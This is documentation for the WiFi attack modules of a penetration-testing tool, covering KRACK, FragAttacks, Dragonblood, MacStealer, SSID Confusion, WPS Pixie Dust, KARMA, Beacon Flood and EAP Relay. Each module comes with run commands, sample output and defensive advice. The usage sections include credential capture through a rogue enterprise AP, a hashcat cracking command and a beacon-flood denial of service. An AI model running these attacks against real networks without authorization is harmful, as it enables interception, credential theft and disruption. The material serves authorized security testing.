# WiFi CVE Exploit Modules

Detailed documentation for the WiFi CVE exploit modules in sniffer-rt.

All modules are located under `src/srt/exploit/wifi/` and require:
- ALFA adapter in monitor mode (`wlan1mon`)
- Target BSSID in `safety/whitelist.yaml`
- Signed `authorization/authorization.yaml`
- Root privileges (for raw frame injection)

---

## 1. KRACK - Key Reinstallation Attack

**Module:** `wifi.krack`

**CVEs:** CVE-2017-13077, CVE-2017-13078, CVE-2017-13079, CVE-2017-13080, CVE-2017-13081

### Description

KRACK (Key Reinstallation Attack) exploits a flaw in the WPA2 4-way handshake. When a client receives a retransmitted Message 3, it reinstalls the already-in-use session key, resetting the nonce counter. This allows an attacker to replay, decrypt, and in some cases forge packets.

The attack works by intercepting Message 3 of the 4-way handshake and replaying it to the client, causing the client to reinstall the pairwise transient key (PTK) with a reset nonce. Frames encrypted after the key reinstallation reuse nonces, breaking the confidentiality guarantees of WPA2.

### MITRE ATT&CK

- **T1557** - Adversary-in-the-Middle: The attacker positions between client and AP to replay handshake messages.

### Prerequisites

- ALFA adapter in monitor mode
- WPA2 target AP and associated client
- Both AP and client must be unpatched (pre-October 2017 firmware)
- Target BSSID and client MAC in whitelist

### Usage Example

```bash
srt run wifi.krack \
    --target AA:BB:CC:DD:EE:FF \
    --client 11:22:33:44:55:66 \
    --interface wlan1mon \
    --channel 6
```

Dry-run (no frames transmitted):

```bash
srt run wifi.krack \
    --target AA:BB:CC:DD:EE:FF \
    --client 11:22:33:44:55:66 \
    --dry-run
```

### Expected Output

**Success (vulnerable):**
```
[*] Monitoring 4-way handshake on channel 6...
[*] Captured Message 3 from AP AA:BB:CC:DD:EE:FF
[*] Replaying Message 3 to client 11:22:33:44:55:66
[+] Client reinstalled key - nonce reuse detected
[+] VULNERABLE: CVE-2017-13077 confirmed
```

**Not vulnerable:**
```
[*] Monitoring 4-way handshake on channel 6...
[*] Captured Message 3 from AP AA:BB:CC:DD:EE:FF
[*] Replaying Message 3 to client 11:22:33:44:55:66
[-] Client rejected replayed Message 3 - patched
```

### Defensive Recommendations

- Update all WiFi clients and APs to firmware released after October 2017
- Enable 802.11w (Management Frame Protection) where supported
- Monitor for duplicate EAPOL Message 3 frames (IDS signature)

---

## 2. FragAttacks - Fragmentation and Aggregation Attacks

**Module:** `wifi.fragattack`

**CVEs:** CVE-2020-24586, CVE-2020-24587, CVE-2020-24588

### Description

FragAttacks exploit design flaws and implementation bugs in the WiFi frame fragmentation and aggregation mechanisms. Three distinct vulnerabilities are tested:

1. **CVE-2020-24586 (Fragment Cache):** The receiver does not clear the fragment cache on reconnection, allowing an attacker to inject fragments from a previous session that get reassembled with fragments from the new session.

2. **CVE-2020-24587 (Mixed Key):** Fragments encrypted under different keys can be reassembled together, allowing injection of plaintext fragments alongside encrypted traffic.

3. **CVE-2020-24588 (A-MSDU Injection):** The "is aggregated" flag in the plaintext frame header is not authenticated, allowing an attacker to inject arbitrary A-MSDU subframes by flipping this flag.

### MITRE ATT&CK

- **T1557** - Adversary-in-the-Middle: Injects crafted fragments into legitimate encrypted traffic.

### Prerequisites

- ALFA adapter in monitor mode
- Target AP or client with unpatched WiFi stack (pre-May 2021)
- Knowledge of target's connected network

### Usage Example

```bash
# Test all three vulnerabilities
srt run wifi.fragattack \
    --target AA:BB:CC:DD:EE:FF \
    --interface wlan1mon \
    --channel 6

# Test a specific CVE
srt run wifi.fragattack \
    --target AA:BB:CC:DD:EE:FF \
    --test-type cache \
    --interface wlan1mon

# Available test types: cache, mixed_key, amsdu
```

### Expected Output

```
[*] Testing FragAttack vulnerabilities against AA:BB:CC:DD:EE:FF
[*] Test 1: Fragment cache attack (CVE-2020-24586)
[+] Fragment cache NOT cleared on reconnect - VULNERABLE
[*] Test 2: Mixed key reassembly (CVE-2020-24587)
[+] Mixed-key fragments reassembled - VULNERABLE
[*] Test 3: A-MSDU injection (CVE-2020-24588)
[-] A-MSDU flag checked - not vulnerable to this test
[+] Result: 2/3 tests indicate vulnerability
```

### Defensive Recommendations

- Update WiFi drivers and firmware to versions released after May 2021
- Implementations should clear the fragment cache on (re)association
- Verify the A-MSDU flag is part of the authenticated additional data (AAD)
- Use network-level encryption (VPN/TLS) as defense-in-depth

---

## 3. Dragonblood - WPA3-SAE Attacks

**Module:** `wifi.dragonblood`

**CVEs:** CVE-2019-9494, CVE-2019-9495, CVE-2019-9496

### Description

Dragonblood attacks target the WPA3-SAE (Simultaneous Authentication of Equals) Dragonfly handshake:

1. **CVE-2019-9494 (Timing Side-Channel):** The password-to-element mapping uses variable-time operations. By measuring AP response times to SAE Commit messages with different passwords, an attacker can leak information about the password.

2. **CVE-2019-9495 (Cache Side-Channel):** Hash-to-group and hash-to-curve operations exhibit cache-timing dependencies that leak password bits.

3. **CVE-2019-9496 (Group Downgrade):** The AP can be forced to accept a weaker elliptic curve group, reducing the security level of the handshake.

### MITRE ATT&CK

- **T1557** - Adversary-in-the-Middle: Timing measurements require network position
- **T1110** - Brute Force: Side-channel leakage reduces password search space

### Prerequisites

- ALFA adapter in monitor mode
- WPA3-SAE enabled target AP
- High-precision timing capability (results vary with network latency)

### Usage Example

```bash
srt run wifi.dragonblood \
    --target AA:BB:CC:DD:EE:FF \
    --interface wlan1mon \
    --channel 36

# Timing attack only
srt run wifi.dragonblood \
    --target AA:BB:CC:DD:EE:FF \
    --attack-type timing \
    --interface wlan1mon
```

### Expected Output

```
[*] Testing Dragonblood against WPA3-SAE AP AA:BB:CC:DD:EE:FF
[*] Sending SAE Commit messages with timing measurement...
[*] Collected 100 timing samples
[*] Timing variance: 2.3ms (threshold: 1.0ms)
[+] Timing side-channel detected - CVE-2019-9494 likely vulnerable
[*] Testing group downgrade...
[*] Proposing ECC group 22 (112-bit security)
[+] AP accepted weak group - CVE-2019-9496 confirmed
```

### Defensive Recommendations

- Update to WPA3-SAE implementations with constant-time hash-to-curve (RFC 9380)
- Configure APs to reject weak ECC groups (only allow group 19/20)
- Enable SAE-PK (SAE with Public Key) for transition-mode networks
- Monitor for excessive SAE Commit messages from a single source

---

## 4. MacStealer - Power-Save Queue Manipulation

**Module:** `wifi.macstealer`

**CVE:** CVE-2022-47522

### Description

MacStealer exploits the 802.11 power-save queue mechanism. When a client enters power-save mode, the AP queues frames destined for it. An attacker can send a forged Authentication frame to the AP using the target client's MAC address, causing the AP to override the security context for that client. Subsequent queued frames are then delivered to the attacker (or leaked in plaintext).

The attack works because many APs process Authentication frames from an already-associated client by tearing down the existing security association and creating a new one, without properly handling the queued frame buffer.

### MITRE ATT&CK

- **T1557.002** - ARP Cache Poisoning (analogous technique at layer 2): Hijacks the AP's client state to intercept traffic.

### Prerequisites

- ALFA adapter in monitor mode
- Target AP vulnerable to security context override
- Target client MAC address known and in whitelist
- Client must be associated to the AP

### Usage Example

```bash
srt run wifi.macstealer \
    --target AA:BB:CC:DD:EE:FF \
    --client 11:22:33:44:55:66 \
    --interface wlan1mon \
    --channel 6
```

### Expected Output

```
[*] Target AP: AA:BB:CC:DD:EE:FF, Client: 11:22:33:44:55:66
[*] Waiting for client to enter power-save mode...
[*] Client entered PS mode - sending forged Auth frame
[*] AP accepted authentication from spoofed MAC
[+] Security context overridden - intercepting queued frames
[+] Captured 3 queued frames destined for client
[+] VULNERABLE: CVE-2022-47522 confirmed
```

### Defensive Recommendations

- Update AP firmware to versions that validate existing associations before processing Auth frames
- Enable 802.11w (PMF) to protect management frames
- Monitor for Authentication frames from already-associated clients (anomaly detection)
- Use per-client VLANs to limit lateral exposure

---

## 5. SSID Confusion

**Module:** `wifi.ssid_confusion`

**CVE:** CVE-2023-52424

### Description

SSID Confusion exploits the fact that the SSID is not included in the 4-way handshake key derivation or authentication. In multi-SSID environments (common in enterprise and mesh networks), an attacker in a MitM position can modify the SSID field in beacon frames, causing a client to believe it connected to one network while actually being on another.

This bypasses VPN auto-trigger policies (which activate based on SSID name) and can expose traffic that the user believed was protected.

### MITRE ATT&CK

- **T1557.002** - ARP Cache Poisoning (layer 2 redirection): Confuses client about network identity for traffic interception.

### Prerequisites

- ALFA adapter in monitor mode
- Multi-SSID environment (same AP serves multiple SSIDs with same credentials)
- MitM position between client and AP
- Target AP BSSID in whitelist

### Usage Example

```bash
srt run wifi.ssid_confusion \
    --target AA:BB:CC:DD:EE:FF \
    --spoof-ssid "Corporate-Secure" \
    --real-ssid "Corporate-Guest" \
    --interface wlan1mon \
    --channel 6
```

### Expected Output

```
[*] Target AP: AA:BB:CC:DD:EE:FF
[*] Spoofing beacon SSID: "Corporate-Guest" -> "Corporate-Secure"
[*] Client 11:22:33:44:55:66 probing for "Corporate-Secure"
[*] Client connected believing it is on "Corporate-Secure"
[*] Actual network: "Corporate-Guest" (no VPN trigger)
[+] SSID Confusion successful - CVE-2023-52424
```

### Defensive Recommendations

- Include the SSID in the 4-way handshake derivation (requires protocol update)
- Use certificate-based authentication (802.1X) which validates server identity
- Configure VPN policies based on network properties beyond SSID name
- Train users to verify network properties before transmitting sensitive data

---

## 6. WPS Pixie Dust

**Module:** `wifi.wps_pixie`

**CVE:** CVE-2014-4624

### Description

WPS Pixie Dust exploits weak random number generation in the WPS (WiFi Protected Setup) protocol. During the M3 message exchange, the AP's nonce (E-S1 and E-S2 values) may be derived from a weak PRNG. If the entropy source is predictable (common in Ralink/MediaTek and Realtek chipsets), the WPS PIN can be recovered offline from a single exchange, bypassing the online rate-limiting protections.

The module wraps the `reaver` tool with Pixie Dust optimization enabled.

### MITRE ATT&CK

- **T1110.001** - Password Guessing: Offline PIN derivation from captured WPS exchange.

### Prerequisites

- ALFA adapter in monitor mode
- Target AP with WPS enabled (check with `wash`)
- Target AP uses a vulnerable chipset (Ralink/Realtek commonly affected)
- `reaver` or `bully` tool installed

### Usage Example

```bash
# Check for WPS-enabled APs first
wash -i wlan1mon

# Run Pixie Dust attack
srt run wifi.wps_pixie \
    --target AA:BB:CC:DD:EE:FF \
    --interface wlan1mon \
    --channel 6
```

### Expected Output

```
[*] Verifying WPS is enabled on AA:BB:CC:DD:EE:FF...
[+] WPS enabled, version 2.0, locked: No
[*] Starting Pixie Dust attack...
[*] Sending M1... received M2
[*] Sending M3... received M4
[*] Analyzing E-S1/E-S2 entropy...
[+] Weak PRNG detected - computing PIN offline
[+] WPS PIN: 12345670
[+] Recovering WPA PSK via full WPS exchange...
[+] WPA PSK: "MyNetworkPassword123"
```

**If Pixie Dust fails:**
```
[*] E-S1/E-S2 appear to use strong PRNG
[-] Pixie Dust attack failed - chipset not vulnerable
[*] Online brute-force would require ~11000 attempts (not attempted)
```

### Defensive Recommendations

- Disable WPS entirely on all APs (strongest mitigation)
- Enable WPS lockout after 3 failed attempts
- Update AP firmware to use cryptographically secure PRNG for WPS nonces
- Monitor for repeated WPS authentication attempts

---

## 7. KARMA - Rogue AP Probe Response

**Module:** `wifi.karma`

**CVEs:** None (technique-based)

### Description

KARMA exploits the WiFi probe request/response mechanism. When a client device searches for previously-connected networks by broadcasting probe requests, the KARMA attack responds to every probe request with a matching probe response, regardless of the actual SSID requested. This tricks the client into connecting to the attacker's rogue AP.

Modern devices mitigate this by not sending directed probe requests for saved networks, but many IoT devices and older clients remain vulnerable.

### MITRE ATT&CK

- **T1557.002** - ARP Cache Poisoning (network-level redirection): Tricks clients into connecting to rogue infrastructure.
- **T1583.001** - Domains (rogue infrastructure): Attacker establishes malicious network infrastructure.

### Prerequisites

- ALFA adapter in monitor mode
- Clients broadcasting probe requests for saved networks
- Target client MACs in whitelist
- `hostapd` installed (for AP creation after association)

### Usage Example

```bash
srt run wifi.karma \
    --interface wlan1mon \
    --channel 6 \
    --duration 60
```

### Expected Output

```
[*] KARMA attack active on wlan1mon (channel 6)
[*] Sniffing probe requests...
[*] Client 11:22:33:44:55:66 probing for "HomeNetwork"
[*] Sending probe response for "HomeNetwork"
[*] Client 11:22:33:44:55:66 probing for "CoffeeShop_WiFi"
[*] Sending probe response for "CoffeeShop_WiFi"
[+] Client 11:22:33:44:55:66 associated to our rogue AP ("HomeNetwork")
[+] Captured 1 client in 60 seconds
```

### Defensive Recommendations

- Configure devices to not broadcast probe requests for saved networks
- Use 802.1X authentication which validates server certificates
- Remove unused saved networks from client devices
- Implement wireless IDS to detect multiple SSIDs from the same BSSID
- Use always-on VPN to protect traffic regardless of network

---

## 8. Beacon Flood - DoS Attack

**Module:** `wifi.beacon_flood`

**CVEs:** None (DoS technique)

### Description

Beacon Flood is a denial-of-service attack that generates hundreds of fake beacon frames per second, each advertising a different random SSID with a unique BSSID. This overwhelms clients' WiFi scanners, causes UI confusion, and can crash vulnerable wireless drivers or network managers.

The module creates beacon frames with randomized SSIDs and BSSIDs, transmitting them rapidly on a specified channel.

**Risk Level:** DESTRUCTIVE_LAB - This module can disrupt all wireless operations on the target channel.

### MITRE ATT&CK

- **T1499.002** - Service Exhaustion Flood: Overwhelms client WiFi subsystems with fake AP advertisements.

### Prerequisites

- ALFA adapter in monitor mode
- Target channel clear of authorized operations
- No requirement for specific target (broadcasts to all)

### Usage Example

```bash
srt run wifi.beacon_flood \
    --interface wlan1mon \
    --channel 6 \
    --ssid-count 500 \
    --duration 30

# Target a specific area with themed SSIDs
srt run wifi.beacon_flood \
    --interface wlan1mon \
    --channel 6 \
    --ssid-prefix "FakeNetwork_" \
    --ssid-count 200
```

### Expected Output

```
[*] Beacon Flood active on channel 6
[*] Generating 500 fake beacon frames...
[*] Transmitting at ~400 beacons/sec
[*] Duration: 30s
[*] Transmitted 12000 beacon frames total
[+] Beacon flood complete
```

### Defensive Recommendations

- Enterprise WLANs should use rogue AP detection (WIPS)
- Client devices should rate-limit AP list updates
- Use 802.11w (PMF) to authenticate management frames
- Segment critical operations to 5 GHz / 6 GHz bands with less congestion
- Monitor for unusual beacon density on WIDS sensors

---

## 9. EAP Relay - Enterprise Credential Theft

**Module:** `wifi.eap_relay`

**CVE:** CVE-2023-52160

### Description

EAP Relay creates a rogue AP that mimics a WPA2-Enterprise SSID. When a client connects, the rogue AP captures the EAP authentication exchange (PEAP, EAP-TTLS, or EAP-TLS) and relays it to the legitimate AP. This allows the attacker to:

1. Harvest plaintext credentials (PEAP-MSCHAPv2)
2. Capture NTLMv2 hashes for offline cracking
3. Establish a MitM session by completing authentication on behalf of the client

CVE-2023-52160 specifically addresses a wpa_supplicant vulnerability where Phase 2 authentication proceeds without verifying the server certificate was validated in Phase 1.

### MITRE ATT&CK

- **T1557** - Adversary-in-the-Middle: Positions between client and authentication server
- **T1556.005** - Reversible Encryption: Captures credentials in relayable format

### Prerequisites

- ALFA adapter in monitor mode
- WPA2-Enterprise target network
- Clients that do not properly validate server certificates
- `hostapd` installed for rogue AP creation
- Knowledge of the enterprise SSID and EAP type in use

### Usage Example

```bash
srt run wifi.eap_relay \
    --target-ssid "Corporate-WiFi" \
    --interface wlan1mon \
    --channel 6 \
    --eap-type peap
```

### Expected Output

```
[*] Creating rogue AP: "Corporate-WiFi" on channel 6
[*] Rogue AP active, waiting for clients...
[*] Client 11:22:33:44:55:66 connecting...
[*] EAP Identity: "jsmith@corp.local"
[*] Relaying PEAP authentication to legitimate AP...
[*] Captured MSCHAPv2 challenge/response:
    Username: jsmith@corp.local
    Challenge: 1a2b3c4d5e6f7a8b
    Response:  [hash data]
[+] Credential capture successful
[*] Hash can be cracked with: hashcat -m 5500 hash.txt wordlist.txt
```

### Defensive Recommendations

- Enforce server certificate validation on all clients (GPO for Windows, profile for macOS/iOS)
- Use EAP-TLS with mutual certificate authentication (no passwords to capture)
- Deploy certificate pinning for the RADIUS server certificate
- Monitor for rogue APs with matching SSIDs (WIPS/WIDS)
- Implement 802.11w (PMF) to prevent deauthentication attacks that drive clients to rogue APs
- Update wpa_supplicant to versions patching CVE-2023-52160

---

## Common Parameters

All WiFi CVE modules accept these common parameters:

| Parameter | Description | Example |
|-----------|-------------|---------|
| `--target` | Target AP BSSID (must be in whitelist) | `AA:BB:CC:DD:EE:FF` |
| `--client` | Target client MAC (if applicable) | `11:22:33:44:55:66` |
| `--interface` | Monitor mode interface | `wlan1mon` |
| `--channel` | WiFi channel to operate on | `6` |
| `--dry-run` | Simulate without transmitting | (flag) |
| `--timeout` | Maximum duration in seconds | `120` |

## Running in Dry-Run Mode

All modules support `--dry-run` which:
- Validates all parameters and prerequisites
- Checks whitelist authorization
- Describes what the attack would do
- Does NOT transmit any frames
- Does NOT modify any hardware state

```bash
srt run wifi.krack --target AA:BB:CC:DD:EE:FF --client 11:22:33:44:55:66 --dry-run
```

## Safety Controls

Every module enforces:
1. **Whitelist check:** Target BSSID must be listed in `safety/whitelist.yaml`
2. **Authorization check:** `authorization/authorization.yaml` must be signed and within date range
3. **Risk acknowledgment:** Modules with `DESTRUCTIVE_LAB` risk require explicit confirmation
4. **Logging:** All operations are logged to the TimescaleDB database via `db.insert_header()`
